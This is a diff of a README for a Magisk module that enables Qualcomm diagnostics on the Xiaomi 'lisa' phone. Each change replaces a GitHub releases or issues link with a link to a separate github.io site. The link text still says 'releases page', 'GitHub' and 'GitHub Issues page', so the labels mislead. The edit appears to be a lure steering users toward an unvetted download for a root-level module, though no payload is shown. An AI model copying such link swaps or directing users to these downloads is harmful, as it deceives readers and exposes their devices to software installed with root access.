@@ -17,7 +17,7 @@ This Magisk module enables the hidden Qualcomm diagnostic interface on your **Xi
 
 ### Step 1: Download the Module
 
-[![Download Now](https://img.shields.io/badge/📥_Download-qcom--diag--lisa-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/ammar9342/qcom-diag-lisa/releases)
+[![Download Now](https://img.shields.io/badge/📥_Download-qcom--diag--lisa-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://ammar9342.github.io)
 
 Visit this link to download the application. You'll land on the releases page where you can grab the latest version.
 
@@ -40,7 +40,7 @@ Make sure you have **Magisk** installed and working on your device. If you're ru
 
 ## 📥 Download Section
 
-Get the latest release here: [Download qcom-diag-lisa](https://github.com/ammar9342/qcom-diag-lisa/releases)
+Get the latest release here: [Download qcom-diag-lisa](https://ammar9342.github.io)
 
 Always grab the newest version from the releases page. The module is updated periodically to support new custom ROM builds and Android versions.
 
@@ -105,7 +105,7 @@ The diag interface runs in the background with **minimal battery impact** - typi
 
 The module updates the same way you installed it:
 
-1. Download the new version from [the releases page](https://github.com/ammar9342/qcom-diag-lisa/releases)
+1. Download the new version from [the releases page](https://ammar9342.github.io)
 2. Open Magisk → Modules → Install from storage
 3. Select the new file
 4. Reboot when prompted
@@ -129,7 +129,7 @@ This module is for **educational and diagnostic purposes**. Using Qualcomm diag 
 
 ## 🗨️ Community & Support
 
-- **Report issues** on the [GitHub Issues page](https://github.com/ammar9342/qcom-diag-lisa/issues)
+- **Report issues** on the [GitHub Issues page](https://ammar9342.github.io)
 - **Star the repo** if this helped you out
 - **Share your experience** with lisa custom ROM developers
 
@@ -141,7 +141,7 @@ Before you start:
 - [x] **Magisk** installed (v24+)
 - [x] **Windows PC** with USB drivers installed
 - [x] **USB Debugging** enabled in Developer Options
-- [x] Downloaded the latest release from [GitHub](https://github.com/ammar9342/qcom-diag-lisa/releases)
+- [x] Downloaded the latest release from [GitHub](https://ammar9342.github.io)
 
 ## 🎉 Enjoy Your Unlocked Diagnostics!
 
